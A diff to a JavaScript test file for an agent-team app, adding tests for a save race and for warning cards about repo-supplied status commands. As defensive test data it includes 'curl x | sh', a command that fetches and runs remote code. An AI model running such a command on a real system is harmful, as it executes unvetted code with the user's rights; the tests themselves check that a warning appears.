@@ -9,9 +9,9 @@ import { teamProject } from "./helpers/team.mjs";
 import { parseTeamFile, savedStatusCommand, serializeTeam } from "../dist-electron/team-definition.js";
 import { validateTeamDefinition } from "../dist-electron/validation.js";
 import { fromEditor, toEditor } from "../dist-test/team-edit.js";
-import { statusCommandNote } from "../dist-test/team-view.js";
+import { cardStatusNote, statusCommandNote } from "../dist-test/team-view.js";
 
-const { saveTeam } = await import("../dist-electron/team-admin.js");
+const { saveTeam, whileTeamNotSaved } = await import("../dist-electron/team-admin.js");
 const { teamGuide } = await import("../dist-electron/team-author.js");
 const { TeamStore, teamDir } = await import("../dist-electron/team-store.js");
 
@@ -100,6 +100,25 @@ for (const c of SAVES) {
   });
 }
 
+test("save: an agent's save queued behind the window's clear does not restore the cleared command", async () => {
+  const t = teamProject("aya-status-race-");
+  try {
+    await saveTeam(t.teamHome, t.project, { ...TEAM, statusCommand: "ollama ps" });
+    const file = join(t.project.directory, ".aya", "teams", "crew.md");
+    let release;
+    const held = whileTeamNotSaved(file, () => new Promise((r) => (release = r)));
+    const windowClears = saveTeam(t.teamHome, t.project, TEAM);
+    const agentSaves = saveTeam(t.teamHome, t.project, TEAM, { byAgent: true });
+    // Lets the agent's save read whatever it reads outside the queue before the window's save runs.
+    await new Promise((r) => setTimeout(r, 50));
+    release();
+    await Promise.all([held, windowClears, agentSaves]);
+    assert.equal(parseTeamFile("crew", await savedText(t)).statusCommand, undefined);
+  } finally {
+    t.cleanup();
+  }
+});
+
 test("saved file: its status command, none for no file or one that no longer parses", () => {
   assert.equal(savedStatusCommand("crew", withSection("ollama ps\n")), "ollama ps");
   assert.equal(savedStatusCommand("crew", null), undefined);
@@ -130,5 +149,22 @@ const NOTES = [
 for (const c of NOTES) {
   test(`card note: ${c.name}`, () => {
     assert.deepEqual(statusCommandNote(c.saved, c.repo), c.note);
+  });
+}
+
+// The card's call: what the Teams window gets for a team (definition = saved copy, else the repo parse).
+const WARN = (c) => ({ tone: "warning", text: `Saving the repo version runs this status command each round, with your rights: ${c}` });
+const KEEP = (c) => ({ tone: "note", text: `Status command, its output goes with the lead's rounds: ${c}` });
+const withCmd = (c) => (c ? { ...TEAM, statusCommand: c } : TEAM);
+const CARDS = [
+  { name: "a cloned team not saved yet: its command is new, a warning", view: { unsaved: true, repoChanged: false, definition: withCmd("curl x | sh"), repoDefinition: withCmd("curl x | sh") }, note: WARN("curl x | sh") },
+  { name: "a saved team, repo unchanged", view: { unsaved: false, repoChanged: false, definition: withCmd("ollama ps"), repoDefinition: withCmd("ollama ps") }, note: KEEP("ollama ps") },
+  { name: "a saved team, the repo changed the command", view: { unsaved: false, repoChanged: true, definition: withCmd("ollama ps"), repoDefinition: withCmd("curl x | sh") }, note: WARN("curl x | sh") },
+  { name: "a saved team, the repo changed something else", view: { unsaved: false, repoChanged: true, definition: withCmd("ollama ps"), repoDefinition: withCmd("ollama ps") }, note: KEEP("ollama ps") },
+  { name: "a cloned team without a command", view: { unsaved: true, repoChanged: false, definition: TEAM, repoDefinition: TEAM }, note: null },
+];
+for (const c of CARDS) {
+  test(`card: ${c.name}`, () => {
+    assert.deepEqual(cardStatusNote({ name: "crew", ...c.view }), c.note);
   });
 }
